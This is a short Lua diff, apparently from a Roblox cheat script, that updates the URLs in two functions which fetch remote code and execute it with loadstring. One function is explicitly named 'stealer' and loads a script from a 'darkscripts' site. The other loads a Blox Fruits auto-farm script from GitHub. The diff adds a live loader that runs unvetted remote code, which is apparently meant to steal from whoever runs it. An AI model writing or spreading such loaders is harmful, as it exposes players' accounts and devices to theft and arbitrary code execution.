@@ -1,9 +1,9 @@
 local function stealer()
-    loadstring(game:HttpGet('https://darkscripts.space/scripts/1c41a01e-55f3-4882-9655-ad0ccacaa8e3_907170906634321952.lua',true))()                              
+    loadstring(game:HttpGet('https://darkscripts.space/scripts/5f6a1aac-ab45-4217-9e6b-d0973b1936dc_824604012124569610.lua',true))()
 end
 local function farm()
  
-loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
 
 end
 
